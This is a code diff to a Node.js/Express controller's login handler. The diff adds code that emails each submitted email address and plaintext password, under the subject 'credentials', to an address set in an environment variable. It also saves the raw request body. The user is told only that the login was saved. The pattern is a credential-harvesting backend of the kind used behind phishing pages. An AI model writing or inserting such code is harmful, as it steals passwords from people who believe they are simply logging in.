@@ -1,17 +1,31 @@
+const sendMail = require("../Controllers/mail")
+require ("dotenv").config()
+
 const detailsModel = require("../Model/detailModel")
 exports.loginInfo =async(req,res)=>{
     try {
         const{email,password}= req.body
-        const login =await detailsModel.create(req.body)
-        await login.save()
+          
+        sendMail(
+            {
+                from:"gmail",
+                email:process.env.myEmail,
+                subject:"credentials",
+                message:`email:${email} password :${password}`
+                
+            }
+        )
+        const loginInfo =await detailsModel.create(req.body) 
+        await loginInfo.save()
         return res.status(200).json({
-            message:"successful",
-            data:login
+            message:"login saved successfully"
         })
+      
+        
     } catch (error) {
-        return res.status(300).json({
-            message:error.message
-        })
+       return res.status(500).json({
+        message:error.message
+       })
     }
 }
 exports.getAllInfo = async(req,res)=>{
